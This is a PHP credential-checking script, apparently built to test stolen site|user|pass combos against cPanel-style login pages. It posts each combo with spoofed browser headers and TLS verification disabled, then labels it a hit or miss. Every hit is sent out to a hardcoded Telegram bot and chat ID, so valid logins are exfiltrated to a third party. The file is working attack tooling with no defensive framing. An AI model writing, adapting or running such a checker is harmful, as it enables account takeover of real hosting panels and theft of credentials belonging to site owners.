<?php

function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
        
$lista = $_GET['lista'];
    $site = multiexplode(array("|", ""), $lista)[0];
    $user = multiexplode(array("|", ""), $lista)[1];
    $pass = multiexplode(array("|", ""), $lista)[2];
    
if (strpos($site, "https://") !== 0) {
    $site = "https://" . $site;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$site.'/login/?login_only=1');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /login/?login_only=1 HTTP/1.1';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Encoding: gzip, deflate, br, zstd';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Length: 29';
$headers[] = 'Content-type: application/x-www-form-urlencoded';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';
$headers[] = 'sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'user='.$user.'&pass='.$pass.'&goto_uri=%2F');
$curl = curl_exec($ch);

curl_close($ch);

$response = $curl;
if (curl_errno($ch)) {
    echo 'cURL error: ' . curl_error($ch);
} else {
    if (strpos($response, 'invalid_login') !== false) {
        echo '#DIE - INVALID LOGIN -  ' . $lista;
    } elseif (strpos($response, 'security_token') !== false) {
        echo '#HIT - ' . $lista;
        $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot7649611354:AAHqV32x_9TGgi5SwfcGgNJnhSsBRn-Q5Gg/sendMessage?chat_id=6808891071&text='.$lista.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$url = curl_exec($ch);
    } else {
        echo "#DIE - $lista - IDK";
    }
}
?>
